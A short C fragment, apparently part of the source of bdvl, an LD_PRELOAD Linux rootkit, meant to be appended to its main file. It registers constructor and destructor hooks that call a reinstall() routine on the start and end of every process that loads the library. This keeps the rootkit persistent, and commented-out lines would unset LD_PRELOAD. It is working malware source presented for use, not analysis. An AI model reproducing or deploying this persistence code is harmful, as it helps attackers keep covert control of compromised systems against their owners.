// this file just gets appended onto the end of bdvl.c
void __attribute ((constructor)) phook_init (void) // on process start
{
    //if(getenv("LD_PRELOAD") != NULL) unsetenv("LD_PRELOAD");
    reinstall();
}

void __attribute ((destructor)) phook_dest (void) // on process end
{
    //if(getenv("LD_PRELOAD") != NULL) unsetenv("LD_PRELOAD");
    reinstall();
}
